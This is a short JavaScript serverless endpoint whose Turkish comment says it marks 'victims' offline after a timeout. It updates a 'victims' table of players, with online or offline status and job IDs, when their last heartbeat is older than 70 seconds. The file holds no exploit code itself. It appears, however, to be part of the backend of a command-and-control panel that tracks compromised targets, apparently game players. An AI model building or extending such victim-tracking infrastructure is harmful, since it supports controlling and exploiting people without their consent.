// api/check.js — timeout geçen kurbanları offline yap
import { neon } from "@neondatabase/serverless";

const sql = neon(process.env.DATABASE_URL);
const SECRET = process.env.CHECK_SECRET || "";
const TIMEOUT = 70_000;

export default async function handler(req, res) {
  if (req.method !== "GET" && req.method !== "POST") return res.status(405).end();

  const secret = req.headers["x-secret"] || req.query?.secret || "";
  if (SECRET && secret !== SECRET) return res.status(401).json({ error: "Unauthorized" });

  try {
    const now = Date.now();
    const cutoff = now - TIMEOUT;
    const result = await sql`
      UPDATE victims
      SET status = 'offline', job_id = ''
      WHERE last_seen < ${cutoff} AND status = 'online'
      RETURNING player
    `;
    return res.status(200).json({ ok: true, offlined: result.map(r => r.player) });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
}
